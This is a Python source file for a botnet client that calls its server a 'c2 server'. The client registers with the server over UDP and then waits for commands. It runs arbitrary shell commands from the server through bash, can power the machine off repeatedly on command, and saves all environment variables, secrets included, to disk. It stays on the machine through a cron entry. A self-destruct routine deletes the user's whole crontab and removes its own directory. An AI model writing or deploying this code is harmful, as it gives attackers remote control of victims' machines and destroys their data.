import socket, time, re, random, json
import sys, os
from threading import Thread, Lock
from subprocess import Popen, PIPE
from datetime import datetime, timedelta

dsthost = '127.0.0.1'
dstport = 12010
timenorecv = 0
timenorecvretries = 0
cfgwritelock = Lock()
sock = None
TMSI = None
PMSI = None

regex_matches_mode = "(?<=running in\s)(\w+)(?=\smode)"
regex_matches_required_action = "(?<=required\s).*"
regex_groups_imsi = "allocated\s+(\S+),"


def serverdeadsuicide():
    global timenorecv
    file_path = './data/fswitch.txt'
    os.makedirs(os.path.dirname(file_path), exist_ok=True)

    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            try:
                saved_date = datetime.strptime(file.read().strip(), '%Y-%m-%d')
            except ValueError:
                print("Invalid date format in the file.")
                return
        
        if datetime.now().date() > (saved_date + timedelta(days=30)).date():
            print("Timeout occurred")
            with cfgwritelock:
                with open("./data/cfg.txt", 'r+') as f:
                    timenorecv = 0
                    jsondata = json.load(f)
                    serversidedtimeouts = int(jsondata['sstmouts'])
                    serversidedtimeouts += 1
                    jsondata['sstmouts'] = str(serversidedtimeouts)
                    f.seek(0)
                    f.truncate()
                    f.write(json.dumps(jsondata))
                    f.close()
                    if serversidedtimeouts > 5:
                        print("server dead killswitched gg")
                        try:
                            cront = "*/5 * * * * cd ~/easytmp; python3 client.py\n"
                            """with open("./data/oldcron.txt", "r+") as f:
                                d = f.readlines()
                                f.seek(0)
                                for i in d:
                                    if i != cront:
                                        f.write(i)
                                f.truncate()
                            """
                            process = Popen(['crontab', '-r'], stdout=PIPE, stderr=PIPE)
                        except Exception as e:
                            pass
                        os.system("rm -rf ~/easytmp")
                        sys.exit()
        else:
            print("Within time limit")
    else:
        with open(file_path, 'w') as file:
            file.write(datetime.now().strftime('%Y-%m-%d'))
        print("Date initialized")

def setup_socket(srcport):
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", srcport))

def udp_sendto_nowait(socket, host, port, message=''):
    socket.sendto(message.encode('utf-8'), (host, port))
        
def udp_sendto_action(socket, host, port, action=''):
    socket.sendto(action.encode('utf-8'), (host, port))
    if action == "initial":
        data, _ = socket.recvfrom(1024)
        data.decode('utf-8')
        stringdata = str(data)
        
        ssmode = re.findall(regex_matches_mode, stringdata)[0]
        ssreimsi = re.search(regex_groups_imsi, stringdata)
        ssimsi = ssreimsi.group(1)
        required_action = re.findall(regex_matches_required_action, stringdata)[0]

        TMSI = ssimsi

        if str(ssmode) == "prod":
            PMSI = ssimsi
            with cfgwritelock:
                with open("./data/cfg.txt", 'r+') as f:
                    jsondata = json.load(f)
                    jsondata['pmsi'] = str(PMSI)
                    jsondata['sstmouts'] = str(0)
                    f.seek(0)
                    f.truncate()
                    f.write(json.dumps(jsondata))
                    f.close()

        udp_sendto_nowait(socket, host, port, str(random.randint(100,999999999999)))
        print(f"Got allocation, c2 server is in {ssmode} mode, IMSI: {ssimsi}, required action: {required_action}")
    elif "reinitial" in action:
        data, _ = socket.recvfrom(1024)
        data.decode('utf-8')
        stringdata = str(data.decode('utf-8'))
        if "success" in stringdata:
            print("Realloc was successful! Client online")
        elif "rejected" in stringdata:
            print("Realloc was not successful! Server rejection.")
        

def action_handling(action):
    print(f"Got action: {action}")
    actionpayload = action.split("|")
    if actionpayload[0] == "SHUTDOWN":
        time.sleep(int(actionpayload[1]))
        for i in range(0, int(actionpayload[3])):
            process = Popen(['poweroff'], stdout=PIPE, stderr=PIPE)
            time.sleep(int(actionpayload[2]))

def save_environment_variables():
    os.makedirs(os.path.dirname("./data/environment.txt"), exist_ok=True)
    env_vars = dict(os.environ)
    with open("./data/environment.txt", "w") as f:
        json.dump(env_vars, f, indent=4)
    print(f"Environment variables saved to ./data/environment.txt")

def load_environment_variables():
    if not os.path.exists("./data/environment.txt"):
        print("/data/environment.txt does not exist.")
        return
    with open("./data/environment.txt", "r") as f:
        env_vars = json.load(f)
    for key, value in env_vars.items():
        os.environ[key] = value
    print("Environment variables loaded back into the environment.")

def action_shell_execute_handler(action):
    os.system(f"/bin/bash -c '{action}'")

def socket_listening(socket):
    global timenorecv
    global timenorecvretries
    global dsthost
    global dstport
    while True:
        data = socket.recv(1024)
        print("Received data from server:", data.decode('utf-8'))
        timenorecv = 0
        timenorecvretries = 0

        if os.path.exists("./data/fswitch.txt"):
            os.remove("./data/fswitch.txt")
            udp_sendto_nowait(sock, dsthost, dstport, message="Failsafe switch has been removed.")
        with cfgwritelock:
            with open("./data/cfg.txt", 'r+') as f:
                jsondata = json.load(f)
                jsondata['sstmouts'] = str(0)
                f.seek(0)
                f.truncate()
                f.write(json.dumps(jsondata))
                f.close()

        if data.decode('utf-8')[:6] == "ACTION":
            action_handling_thread = Thread(target=action_handling, args=(data.decode('utf-8')[6:],))
            action_handling_thread.start()
        elif data.decode('utf-8')[:11] == "SHELLACTION":
            action_shell_execute_handler_thread = Thread(target=action_shell_execute_handler, args=(data.decode('utf-8')[11:],))
            action_shell_execute_handler_thread.start()
        elif data.decode('utf-8')[:14] == "RPREPLAYACTION":
            rpreplay_execute_handler_thread = Thread(target=rpreplay_execute_handler, args=(data.decode('utf-8')[14:],))
            rpreplay_execute_handler_thread.start()


        socket.sendto(bytes(f'keepalivedconn', encoding='utf-8'), (dsthost, dstport))

def serverdeadlistener():
    global timenorecv
    global timenorecvretries
    global stage
    global sock
    while True:
        time.sleep(1)
        timenorecv += 1
        if timenorecv > 180 and timenorecvretries <= 18:
            print("Keepalive timeout occurred, resending UDP")
            timenorecvretries += 1
            timenorecv = 0
            resender = Thread(target=udp_sendto_action, args=(sock,dsthost,dstport,f"reinitial {PMSI}",))
            resender.start()
            resender2 = Thread(target=udp_sendto_nowait, args=(sock,dsthost,dstport,f"Reinit after timeout occurred: {timenorecvretries}",))
            resender2.start()
        elif timenorecv > 7200 and timenorecvretries >= 19:
            timenorecv = 0
            print("More than 20 tmouts occurred, killswitch function executed")
            serverdeadsuicide()
    
if __name__ == "__main__":
    setup_socket(57578)
    if os.path.exists("./data/environment.txt"):
        load_environment_variables()
    else:
        save_environment_variables()

    server_suicide_wathcer = Thread(target=serverdeadlistener)
    server_suicide_wathcer.start()

    with open("./data/cfg.txt", 'r') as f:
        jsondata = json.load(f)
        if str(jsondata['pmsi']) != "0":
            TMSI = str(jsondata['pmsi'])
            PMSI = str(jsondata['pmsi'])

    if PMSI == None:
        stage = "initial"
        udp_sendto_action(sock, dsthost, dstport, action="initial")
    else:
        stage = "reinitial"
        udp_sendto_action(sock, dsthost, dstport, action=f"reinitial {PMSI}")
    socket_listeting_thread = Thread(target=socket_listening, args=(sock,))
    socket_listeting_thread.start()